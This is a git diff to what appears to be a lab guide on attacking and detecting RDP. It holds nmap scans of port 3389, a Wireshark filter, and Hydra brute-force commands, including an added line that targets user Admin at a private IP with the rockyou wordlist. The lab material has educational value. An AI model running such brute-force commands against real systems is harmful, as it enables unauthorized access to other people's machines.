@@ -52,6 +52,7 @@ nmap -sV -p 3389 ip
 # Aggressive scan
 nmap -sS -sV -O -p ip
 ```
+
 <img width="712" height="712" alt="open-port-rdp-scan" src="https://github.com/user-attachments/assets/6c2a5c7d-fa88-4795-bcfd-a905510efc0e" />
 
 ---
@@ -75,7 +76,10 @@ tcp.port == 3389 && tcp.flags.rst == 1
 
 ```bash
 hydra -l username -P /tmp/mypassword.txt -t 4 -W 2 ip rdp
+hydra -l Admin -P /usr/share/wordlists/rockyou.txt 192.168.100.27 rdp
 ```
+<img width="1920" height="955" alt="hydra-brute-force" src="https://github.com/user-attachments/assets/474127bc-5ce7-4b55-8442-60e5f36f3b4c" />
+
 
 ### How Hydra Works:
 Hydra is a fast network login cracker. It tries multiple username and password combinations against a service (in this case RDP on port 3389) until it finds the correct one.
